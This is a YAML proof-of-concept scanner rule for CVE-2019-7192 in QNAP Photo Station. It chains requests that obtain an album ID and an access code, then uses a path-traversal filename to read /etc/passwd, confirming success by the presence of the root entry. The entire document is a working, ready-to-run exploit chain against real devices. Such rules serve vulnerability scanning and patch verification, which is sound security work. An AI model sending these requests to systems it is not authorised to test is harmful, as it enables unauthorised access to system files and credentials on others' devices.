name: poc-yaml-qnap-cve-2019-7192
rules:
    - method: POST
      path: /photo/p/api/album.php
      headers:
          Content-Type: application/x-www-form-urlencoded
      body: a=setSlideshow&f=qsamplealbum
      expression: |
        response.status == 200
      search: >-
        <output>(?P<album_id>.*?)</output>
    - method: GET
      path: /photo/slideshow.php?album={{album_id}}
      expression: |
        response.status == 200
      search: >-
        encodeURIComponent\(\'(?P<access_code>.*?)\'\)
    - method: POST
      path: /photo/p/api/video.php
      headers:
          Content-Type: application/x-www-form-urlencoded
      body: album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=./../../../../../etc/passwd
      expression: |
        response.status == 200 && response.body.bcontains(b"admin:x:0:0")
detail:
    author: Hzllaga
    links:
        - https://github.com/th3gundy/CVE-2019-7192_QNAP_Exploit
